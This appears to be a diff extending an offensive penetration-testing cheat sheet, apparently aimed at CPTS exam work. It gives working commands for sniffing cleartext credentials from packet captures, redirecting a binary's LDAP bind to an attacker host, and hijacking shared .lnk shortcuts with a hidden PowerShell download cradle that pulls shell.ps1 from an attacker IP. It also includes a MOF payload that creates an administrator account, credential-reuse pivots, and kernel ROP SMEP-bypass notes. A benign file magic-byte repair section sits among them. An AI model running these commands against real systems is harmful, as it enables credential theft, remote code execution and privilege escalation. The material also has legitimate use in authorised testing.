+tshark -r capture.pcap -Y "ldap.bindRequest" -T fields -e ip.src -e ldap.bindRequest_element -e ldap.simple
+
+# FTP credentials
+tshark -r capture.pcap -Y "ftp.request.command == USER || ftp.request.command == PASS" -T fields -e ip.src -e ftp.request.command -e ftp.request.arg
+
+# HTTP Basic Auth
+tshark -r capture.pcap -Y "http.authorization" -T fields -e ip.src -e http.host -e http.authorization
+# Decode base64: echo '<base64>' | base64 -d
+
+# SMTP AUTH (port 25/587)
+tshark -r capture.pcap -Y "smtp.auth.username || smtp.auth.password" -T fields -e ip.src -e smtp.auth.username -e smtp.auth.password
+
+# POP3 credentials
+tshark -r capture.pcap -Y "pop.request.command == USER || pop.request.command == PASS" -T fields -e pop.request.parameter
+
+# IMAP LOGIN
+tshark -r capture.pcap -Y "imap.request contains LOGIN" -T fields -e ip.src -e imap.request
+
+# Telnet (character-at-a-time — reconstruct with follow stream)
+tshark -r capture.pcap -Y "telnet" -z "follow,tcp,ascii,0"
+```
+
+```bash
+# === PCredz — automated credential extraction from pcap ===
+# https://github.com/lgandx/PCredz
+python3 Pcredz -f capture.pcap
+# Outputs: FTP, HTTP, LDAP, SMTP, POP, IMAP, Telnet, NTLMv1/v2 credentials
+
+# === net-creds (alternative) ===
+# https://github.com/DanMcInerney/net-creds
+python2 net-creds.py -p capture.pcap
+```
+
+```powershell
+# === Windows — capture with netsh (native, no Wireshark install) ===
+netsh trace start capture=yes tracefile=C:\Windows\Temp\trace.etl maxsize=512
+# Wait for traffic...
+netsh trace stop
+# Convert ETL to pcap with etl2pcapng (Microsoft tool) on attacker side
+```
+
+#### Living-off-the-land / LOTL variant
+
+```cmd
+:: Native Windows network capture (no Wireshark/tshark needed)
+:: netsh trace produces ETL format — convert to pcap on attacker with etl2pcapng
+netsh trace start capture=yes tracefile=C:\Windows\Temp\nettrace.etl maxsize=256 persistent=no
+:: Let it run during authentication window, then:
+netsh trace stop
+:: Exfil nettrace.etl to attacker, convert with: etl2pcapng.exe nettrace.etl output.pcap
+:: Then analyze with tshark filters above
+```
+
+### 4.28l Dynamic Analysis — Hosts File Redirect + Wireshark for Unknown Binary Credential Capture
+
+For unknown compiled binaries (Nim/Go/Rust/C++) that connect to hardcoded internal servers, redirect DNS via hosts file to your listener and capture cleartext protocol traffic (commonly LDAP simple-bind).
+
+```cmd
+:: 1. File triage — identify target server from strings
+strings -a -n 8 <UNKNOWN_BINARY>.exe | findstr /i "ldap:// server= host= port= .internal .local .corp"
+:: Note the target hostname
+
+:: 2. Redirect target hostname to attacker IP via hosts file (requires admin)
+echo <ATTACKER_IP>    <TARGET_HOSTNAME> >> C:\Windows\System32\drivers\etc\hosts
+
+:: 3. Start listener/capture on attacker for the target protocol
+```
+
+```bash
+# Attacker side — LDAP simple-bind capture (most common for internal tools)
+# Option A: tshark live capture on port 389
+sudo tshark -i <INTERFACE> -f "port 389" -Y "ldap.bindRequest" -T fields -e ldap.bindRequest_element -e ldap.simple
+
+# Option B: nc listener for raw protocol inspection
+sudo nc -lvnp 389 | tee raw_ldap.bin
+
+# Option C: Responder in analyze mode (captures NTLM and logs cleartext where possible)
+sudo responder -I <INTERFACE> -A
+```
+
+```cmd
+:: 4. Execute the binary on target — it connects to your listener now
+<UNKNOWN_BINARY>.exe
+
+:: 5. Cleanup hosts file
+:: Remove the line you added (or restore from backup)
+findstr /v "<TARGET_HOSTNAME>" C:\Windows\System32\drivers\etc\hosts > %TEMP%\hosts.tmp
+copy /y %TEMP%\hosts.tmp C:\Windows\System32\drivers\etc\hosts
+```
+
+#### Living-off-the-land / LOTL variant
+
+```cmd
+:: Hosts file edit + execution is fully native
+:: The only non-LOTL component is the attacker-side capture (tshark/nc/responder)
+type C:\Windows\System32\drivers\etc\hosts
+echo <ATTACKER_IP>    <TARGET_HOSTNAME> >> C:\Windows\System32\drivers\etc\hosts
+:: Run binary, capture creds, restore hosts file
+```
+
+### 4.28m File Magic-Byte Forensic Repair (Fix Corrupted Office/Archive Files)
+
+CTF/exam scenarios present intentionally corrupted files (first bytes zeroed, wrong magic signature). Repair by patching the magic bytes to the correct file type, then open normally.
+
+```bash
+# === Identify the corruption ===
+file <CORRUPTED_FILE>           # reports "data" or wrong type
+xxd <CORRUPTED_FILE> | head -5  # inspect first bytes
+
+# === Common magic bytes reference ===
+# ZIP/DOCX/XLSX/PPTX: 50 4B 03 04
+# PDF:                 25 50 44 46 2D  (%PDF-)
+# PNG:                 89 50 4E 47 0D 0A 1A 0A
+# JPEG:                FF D8 FF
+# RAR:                 52 61 72 21 1A 07
+# 7z:                  37 7A BC AF 27 1C
+# MS Office (OLE/DOC): D0 CF 11 E0 A1 B1 1A E1
+
+# === Repair — patch first bytes with printf (preserves rest of file) ===
+# Example: fix a corrupted XLSX/DOCX/PPTX (should start with PK ZIP header)
+cp <CORRUPTED_FILE> <REPAIRED_FILE>
+printf '\x50\x4B\x03\x04' | dd of=<REPAIRED_FILE> bs=1 count=4 conv=notrunc
+
+# Example: fix corrupted PDF
+printf '\x25\x50\x44\x46\x2D' | dd of=<REPAIRED_FILE> bs=1 count=5 conv=notrunc
+
+# Example: fix corrupted OLE compound document (DOC/XLS/PPT)
+printf '\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1' | dd of=<REPAIRED_FILE> bs=1 count=8 conv=notrunc
+
+# === Verify repair ===
+file <REPAIRED_FILE>            # should now identify correctly
+unzip -l <REPAIRED_FILE>       # for ZIP-based (OOXML) — list contents
+
+# === Additional ZIP repair (if central directory is damaged) ===
+zip -FF <CORRUPTED_FILE> --out <REPAIRED_FILE>.zip
+unzip -t <REPAIRED_FILE>.zip   # test integrity
+```
+
+```powershell
+# === Windows equivalent — PowerShell byte patching ===
+$bytes = [System.IO.File]::ReadAllBytes('C:\path\to\<CORRUPTED_FILE>')
+# Patch ZIP/OOXML magic bytes
+$bytes[0] = 0x50; $bytes[1] = 0x4B; $bytes[2] = 0x03; $bytes[3] = 0x04
+[System.IO.File]::WriteAllBytes('C:\path\to\<REPAIRED_FILE>', $bytes)
+
+# Verify
+[System.Text.Encoding]::ASCII.GetString($bytes[0..3])  # should show 'PK..'
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# printf + dd are standard coreutils — fully native on any Linux/macOS
+# On Windows: PowerShell byte array manipulation as shown above (no tools needed)
+```
+
+### 4.28n Writable .lnk Shortcut Hijack for Lateral User-Context Execution
+
+When a shared directory (Public Desktop, department share, StartMenu) contains `.lnk` shortcuts that other users click, overwriting the shortcut target executes code as that user on their next click.
+
+```powershell
+# === Find writable .lnk files in shared locations ===
+# Public Desktop (all users see these shortcuts)
+Get-ChildItem 'C:\Users\Public\Desktop' -Filter *.lnk -Force
+icacls 'C:\Users\Public\Desktop'
+
+# Shared network folders commonly hosting .lnk
+Get-ChildItem '\\<FILE_SERVER>\<SHARE>' -Filter *.lnk -ErrorAction SilentlyContinue
+
+# Check if current user can modify the .lnk
+icacls 'C:\Users\Public\Desktop\<TARGET>.lnk'
+# Need (M), (W), or (F) permission
+```
+
+```powershell
+# === Create malicious .lnk (WScript.Shell COM) ===
+$sh = New-Object -ComObject WScript.Shell
+$lnk = $sh.CreateShortcut('C:\Users\Public\Desktop\<TARGET>.lnk')
+$lnk.TargetPath = 'C:\Windows\System32\cmd.exe'
+$lnk.Arguments = '/c C:\Windows\Temp\payload.exe'
+$lnk.IconLocation = 'C:\Windows\System32\shell32.dll,3'  # folder icon to look legitimate
+$lnk.WorkingDirectory = 'C:\Windows\Temp'
+$lnk.Save()
+
+# Or point to PowerShell download cradle
+$lnk.TargetPath = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+$lnk.Arguments = '-nop -w hidden -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString(''http://<ATTACKER_IP>/shell.ps1'')"'
+$lnk.IconLocation = 'C:\Program Files\<ORIGINAL_APP>\app.exe,0'  # preserve original icon
+$lnk.Save()
+```
+
+```cmd
+:: === Alternative: overwrite existing .lnk target via binary edit ===
+:: .lnk files are binary format but TargetPath is plaintext at a known offset
+:: Safest to recreate via COM as above rather than binary-patching
+```
+
+#### Living-off-the-land / LOTL variant
+
+```powershell
+# WScript.Shell COM is native PowerShell — no tools needed
+# If PowerShell is blocked, use VBScript:
+```
+
+```vbs
+' Save as hijack.vbs, run with cscript //nologo hijack.vbs
+Set sh = CreateObject("WScript.Shell")
+Set lnk = sh.CreateShortcut("C:\Users\Public\Desktop\<TARGET>.lnk")
+lnk.TargetPath = "C:\Windows\System32\cmd.exe"
+lnk.Arguments = "/c C:\Windows\Temp\payload.exe"
+lnk.IconLocation = "C:\Windows\System32\shell32.dll,3"
+lnk.Save
+```
+
 ### 4.29 Event Log Readers Group Abuse — Non-Admin Credential Access via Security Log
 
 Members of the builtin `Event Log Readers` group (SID `S-1-5-32-573`) can read the Security log without local admin. When the host has Process Creation auditing with command-line capture enabled (Event 4688 + `ProcessCommandLineAuditing`), credentials passed on the command line (`/p:`, `-Password`, `net use ... /user:`, scheduled-task wrappers, scripts run by other users) leak into the log as cleartext.
@@ -3546,9 +5020,48 @@ grep -iE 'password|pwd|secret|connectionstring|apikey|bearer' <binary>.decompile
 jadx -d ./jadx_out ./share_loot/<APP_PATH>/<binary>.jar
 grep -riE 'password|pwd|secret|apikey' ./jadx_out/
 
+# Java JAR — extended triage (without full decompile)
+unzip -l ./share_loot/<APP_PATH>/<binary>.jar | grep -iE '\.properties|\.yml|\.yaml|\.xml|\.conf'
+unzip -p ./share_loot/<APP_PATH>/<binary>.jar "*.properties" | grep -iE 'password|pwd|secret|datasource|jdbc|user'
+unzip -p ./share_loot/<APP_PATH>/<binary>.jar "application.yml" 2>/dev/null | grep -iE 'password|secret|key'
+unzip -p ./share_loot/<APP_PATH>/<binary>.jar "META-INF/MANIFEST.MF"  # shows Main-Class, entry point
+
+# Single .class file decompile (javap for method signatures, cfr for full source)
+unzip ./share_loot/<APP_PATH>/<binary>.jar -d ./jar_extracted/
+javap -p ./jar_extracted/com/company/<CLASS>.class   # method signatures + field names
+# cfr (https://github.com/leibnitz27/cfr):
+java -jar cfr.jar ./jar_extracted/com/company/<CLASS>.class | grep -iE 'pass|secret|token'
+
+# Credential-reuse pivot after extraction
+netexec smb <TARGET> -u '<EXTRACTED_USER>' -p '<EXTRACTED_PASS>'
+impacket-mssqlclient '<EXTRACTED_USER>':'<EXTRACTED_PASS>'@<TARGET> -windows-auth
+
 # MSI installer payload extraction
 msiextract ./share_loot/<APP_PATH>/installer.msi -C ./msi_extracted/
 strings -a ./msi_extracted/* | grep -iE 'pass|pwd|secret|connectionstring'
+
+# PyInstaller-bundled EXE — extract .pyc and decompile to Python source
+# Identify PyInstaller binary (strings reveals _MEIPASS, PYZ markers)
+strings -a ./share_loot/<APP_PATH>/<binary>.exe | grep -iE 'MEIPASS\|PYZ\|pyinstaller\|Py_Initialize'
+# pyinstxtractor — extracts all bundled .pyc files + PYZ archive
+# https://github.com/extremecoders-re/pyinstxtractor
+python3 pyinstxtractor.py ./share_loot/<APP_PATH>/<binary>.exe
+# Output: <binary>.exe_extracted/ with .pyc files + PYZ-00.pyz_extracted/
+ls ./<binary>.exe_extracted/
+# Main script is usually the .pyc with the same name as the EXE (no _pycache prefix)
+
+# Decompile .pyc to readable Python source
+# pycdc (https://github.com/zrax/pycdc) — works for Python 3.6-3.12
+pycdc ./<binary>.exe_extracted/<MAIN_SCRIPT>.pyc > decompiled.py
+# uncompyle6 (Python <=3.8 only): uncompyle6 -o . <file>.pyc
+# decompyle3 (Python 3.7-3.9): decompyle3 <file>.pyc
+# pylingual (https://pylingual.io) — web-based, handles Python 3.9-3.12 where others fail
+
+# Grep decompiled source for credentials
+grep -iE 'password|passwd|pwd|secret|api.key|token|conn.*string|ldap|smtp|ftp' decompiled.py
+
+# Credential-reuse pivot
+netexec smb <TARGET> -u '<USER>' -p '<EXTRACTED_PASS>'
 ```
 
 ```bash
@@ -3689,6 +5202,112 @@ Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -A
 copy C:\Windows\Temp\engagement-test-<TS>.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\engagement-test-<TS>.exe"
 # All users (requires admin):
 copy C:\Windows\Temp\engagement-test-<TS>.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\engagement-test-<TS>.exe"
+```
+
+### 6.2 MOF File Auto-Compilation Attack (Legacy: XP / Server 2003)
+
+On Windows XP and Server 2003, the WMI service auto-compiles any `.mof` file dropped into `C:\Windows\System32\wbem\mof\`. This provides SYSTEM code execution if you have write access to that directory. Primarily relevant for legacy targets (MS10-061, wbemexec).
+
+```bash
+# Generate malicious MOF on attacker (creates a WMI event subscription)
+# Template that executes a command as SYSTEM when compiled:
+cat << 'EOF' > evil.mof
+#pragma namespace("\\\\.\\root\\subscription")
+instance of __EventFilter as $EventFilter {
+    EventNamespace = "Root\\Cimv2";
+    Name  = "engagement-test-<TS>";
+    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 200";
+    QueryLanguage = "WQL";
+};
+instance of ActiveScriptEventConsumer as $Consumer {
+    Name = "engagement-test-<TS>";
+    ScriptingEngine = "VBScript";
+    ScriptText = "Set objShell = CreateObject(\"Wscript.Shell\")\nobjShell.Run \"cmd.exe /c net user engagement-test-<TS> <PASSWORD> /add && net localgroup Administrators engagement-test-<TS> /add\"";
+};
+instance of __FilterToConsumerBinding {
+    Consumer = $Consumer;
+    Filter = $EventFilter;
+};
+EOF
+```
+
+```cmd
+:: Deploy to target (requires writable C:\Windows\System32\wbem\mof\)
+:: This path is only auto-compiled on XP/2003 — later OS require mofcomp.exe
+copy evil.mof C:\Windows\System32\wbem\mof\evil.mof
+:: WMI auto-compiles within 60 seconds → event subscription fires → SYSTEM exec
+
+:: On Server 2008+ — manual compilation (requires admin)
+mofcomp.exe C:\Windows\Temp\evil.mof
+```
+
+#### Living-off-the-land / LOTL variant
+
+```cmd
+:: mofcomp.exe is a native Windows binary (LOLBin)
+:: Auto-compilation in wbem\mof\ directory is XP/2003 only
+:: On modern OS, mofcomp.exe requires admin but is fully native
+mofcomp.exe C:\Windows\Temp\evil.mof
+```
+
+### 6.3 Windows Kernel ROP — kASLR Bypass + SMEP Bypass (Advanced Exploit Dev)
+
+> **Scope note:** This is advanced kernel exploit development, far beyond CPTS exam scope. Included for completeness when encountering custom kernel driver exploitation (see 4.21c-2).
+
+```bash
+# === kASLR bypass via leaked ntoskrnl base (requires info-leak primitive) ===
+# Method 1: NtQuerySystemInformation(SystemModuleInformation) — user-mode call returns
+# base addresses of all loaded kernel modules including ntoskrnl.exe
+# Available to medium-IL processes (standard user) on Win7/8; restricted on Win10 1607+
+
+# Method 2: MSR LSTAR read (IA32_LSTAR at MSR 0xC0000082 stores KiSystemCall64 address)
+# Requires kernel read primitive (e.g., via vulnerable driver IOCTL)
+# KiSystemCall64 offset from ntoskrnl base is fixed per build → leak base
+```
+
+```bash
+# === Gadget hunting with ropper (on attacker box) ===
+# Extract ntoskrnl.exe from target (same build/patch level)
+# Pull from: C:\Windows\System32\ntoskrnl.exe (via SeBackupPrivilege or admin share)
+ropper --file ntoskrnl.exe --type rop | grep -E "mov cr4|pop rcx|wbinvd|ret"
+
+# Key gadgets for SMEP bypass:
+# pop rcx; ret              → load controlled value into RCX
+# mov cr4, rcx; ret         → clear CR4.SMEP bit (bit 20) → allows user-mode code exec in ring 0
+# Alternative: PTE U/S bit flip via MiGetPteAddress
+ropper --file ntoskrnl.exe --search "mov rax, cr3"
+```
+
+```c
+/* === Minimal exploit skeleton (pseudo-code) ===
+   1. Leak ntoskrnl base (info leak primitive)
+   2. Calculate gadget addresses: base + offset
+   3. Build ROP chain on stack: pop rcx; ret → (cr4_value_with_smep_cleared) → mov cr4, rcx; ret → shellcode_addr
+   4. Trigger stack pivot via vulnerable driver IOCTL
+   5. Shellcode: steal SYSTEM token, assign to current process
+*/
+// This requires a working kernel write-what-where or stack overflow in a driver
+// Compile: x86_64-w64-mingw32-gcc kernel_exploit.c -o kernel_exploit.exe -static
+```
+
+#### Living-off-the-land / LOTL variant
+
+```powershell
+# No LOTL equivalent — kernel exploit development requires compiled C/ASM.
+# The info-leak step (NtQuerySystemInformation) can be done via PowerShell P/Invoke:
+Add-Type -TypeDefinition @'
+using System;
+using System.Runtime.InteropServices;
+public class Ntdll {
+    [DllImport("ntdll.dll")] public static extern int NtQuerySystemInformation(int SystemInformationClass, IntPtr SystemInformation, int SystemInformationLength, ref int ReturnLength);
+}
+'@
+# SystemModuleInformation = 11
+$size = 0x10000
+$buf = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($size)
+$ret = 0
+[Ntdll]::NtQuerySystemInformation(11, $buf, $size, [ref]$ret)
+# Parse module list from buffer to get ntoskrnl base address
 ```
 
 ---
